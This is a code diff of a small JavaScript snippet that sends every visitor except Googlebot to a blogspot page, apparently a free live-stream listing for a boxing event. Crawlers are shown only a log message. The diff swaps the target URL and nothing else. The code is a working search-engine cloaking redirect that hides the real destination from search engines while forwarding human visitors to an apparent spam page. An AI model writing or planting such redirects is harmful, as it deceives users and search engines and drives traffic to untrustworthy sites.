@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://trendingnewsbbbbb111.blogspot.com/2026/10/translyatsiya-volkov-kuniev-pryamoy-efir-24-oktyabrya-2026-g-smotret-besplatno-v4.html";
+  window.location.href = "https://trendingnewsbbbbb111.blogspot.com/2026/10/24-2026_0791468810.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
